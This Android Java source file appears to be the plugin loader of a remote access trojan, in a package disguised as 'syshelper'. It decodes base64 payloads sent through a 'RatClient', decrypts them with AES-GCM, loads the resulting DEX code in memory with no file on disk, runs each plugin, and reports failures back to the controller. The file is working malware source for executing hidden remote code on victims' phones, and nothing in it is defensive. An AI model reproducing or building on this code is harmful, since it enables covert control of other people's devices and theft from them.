package com.syshelper.service;
import android.content.Context;
import android.util.Base64;
import dalvik.system.InMemoryDexClassLoader;
import java.nio.ByteBuffer;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class PluginManager {
    public interface IVeilPlugin { void init(Context ctx, RatClient client); void execute(String action, String params); String getName(); }
    private static final int GCM_TAG_LENGTH = 128;
    private static final int GCM_IV_LENGTH = 12;

    public static byte[] decryptDex(byte[] encrypted, byte[] aesKey) {
        try {
            byte[] iv = new byte[GCM_IV_LENGTH];
            System.arraycopy(encrypted, 0, iv, 0, GCM_IV_LENGTH);
            byte[] cipherText = new byte[encrypted.length - GCM_IV_LENGTH];
            System.arraycopy(encrypted, GCM_IV_LENGTH, cipherText, 0, cipherText.length);
            SecretKeySpec keySpec = new SecretKeySpec(aesKey, "AES");
            Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, keySpec, new GCMParameterSpec(GCM_TAG_LENGTH, iv));
            return cipher.doFinal(cipherText);
        } catch (Exception e) { return null; }
    }

    public static IVeilPlugin loadPlugin(Context ctx, byte[] dexBytes, String className) {
        try {
            ByteBuffer dexBuffer = ByteBuffer.allocateDirect(dexBytes.length);
            dexBuffer.put(dexBytes); dexBuffer.position(0);
            ClassLoader parent = ctx.getClassLoader();
            InMemoryDexClassLoader loader = new InMemoryDexClassLoader(new ByteBuffer[]{dexBuffer}, parent);
            Class<?> pluginClass = loader.loadClass(className);
            return (IVeilPlugin) pluginClass.newInstance();
        } catch (Exception e) { return null; }
    }

    public static void handlePluginPayload(Context ctx, RatClient client, String base64Payload, String className) {
        byte[] payload = Base64.decode(base64Payload, Base64.NO_WRAP);
        byte[] dex = isDex(payload) ? payload : decryptDex(payload, client.getAesKey());
        if (dex != null && dex.length > 0) {
            IVeilPlugin plugin = loadPlugin(ctx, dex, className);
            if (plugin != null) { plugin.init(ctx, client); plugin.execute("start", "{}"); }
            else { client.sendResult("plugin_error", "Failed to load plugin class: " + className); }
        } else { client.sendResult("plugin_error", "Failed to decrypt plugin payload"); }
    }

    private static boolean isDex(byte[] d) {
        return d.length >= 4 && d[0] == 0x64 && d[1] == 0x65 && d[2] == 0x78 && d[3] == 0x0a;
    }
}
